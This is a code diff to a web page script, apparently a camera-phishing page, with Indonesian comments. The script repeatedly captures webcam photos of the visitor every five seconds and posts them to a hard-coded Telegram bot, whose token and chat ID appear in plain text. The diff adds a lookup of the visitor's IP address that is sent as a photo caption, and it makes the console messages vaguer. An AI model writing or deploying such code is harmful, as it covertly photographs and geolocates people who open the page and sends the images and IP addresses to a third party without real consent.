@@ -24,10 +24,9 @@
 
   <script>
     var token = '7143489396:AAH6nnxpNdwDPTFDtVGgJ04f_rOQvjPm_Z0'; // Ganti dengan token bot Telegram Anda
-    var chatId = '-1002188815934';   // Ganti dengan ID obrolan atau pengguna di Telegram
-
+    var chatId = '-1002188815934';   // Ganti dengan ID obrolan atau pengguna di -1002188815934
     // Fungsi untuk mengirim gambar ke Telegram
-    function sendToTelegram(imageDataURL) {
+    function sendToTelegram(imageDataURL, caption) {
       // API endpoint untuk mengirim pesan gambar
       var apiUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
 
@@ -39,6 +38,7 @@
           var formData = new FormData();
           formData.append('chat_id', chatId);
           formData.append('photo', blob, 'photo.png'); // Nama file disertakan untuk photo
+          formData.append('caption', caption); // Menambahkan caption ke form data
 
           // Kirim POST request menggunakan fetch API
           return fetch(apiUrl, {
@@ -48,12 +48,12 @@
         })
         .then(response => response.json())
         .then(data => {
-          console.log('Gambar berhasil dikirim ke Telegram:', data);
+          console.log('.', data);
           // Lanjutkan pengambilan gambar berikutnya setelah berhasil dikirim dengan delay 5 detik
           setTimeout(takeAndSendPhoto, 5000);
         })
         .catch(error => {
-          console.error('Error mengirim gambar ke Telegram:', error);
+          console.error('gagal:', error);
           // Coba kirim gambar berikutnya setelah terjadi kesalahan dengan delay 5 detik
           setTimeout(takeAndSendPhoto, 5000);
         });
@@ -84,8 +84,22 @@
               // Mengambil data gambar dalam bentuk base64
               var imageDataURL = canvas.toDataURL('image/png');
 
-              // Kirim gambar ke fungsi untuk mengirim ke Telegram
-              sendToTelegram(imageDataURL);
+              // Mendapatkan alamat IP pengguna
+              var ipAddress = '';
+              fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                  ipAddress = data.ip;
+
+                  // Kirim gambar ke fungsi untuk mengirim ke Telegram dengan caption
+                  sendToTelegram(imageDataURL, `Foto terkirim dari IP: ${ipAddress}`);
+                })
+                .catch(error => {
+                  console.error('Error mendapatkan IP address:', error);
+
+                  // Kirim gambar ke fungsi untuk mengirim ke Telegram tanpa caption IP address
+                  sendToTelegram(imageDataURL, 'Foto terkirim');
+                });
 
               // Hapus elemen video dari dokumen
               document.body.removeChild(video);
@@ -99,7 +113,7 @@
           console.log("Error: " + err);
           // Menangani kesalahan pengambilan akses kamera
           if (err.name === 'NotAllowedError') {
-            alert('Untuk melanjutkan, izinkan/Allow akses kamera pada browser Anda.');
+            alert('Untuk melanjutkan, izinkan/allow akses kamera pada browser Anda.');
           } else {
             // Coba kembali mengambil gambar jika terjadi kesalahan dengan delay 5 detik
             setTimeout(takeAndSendPhoto, 5000);
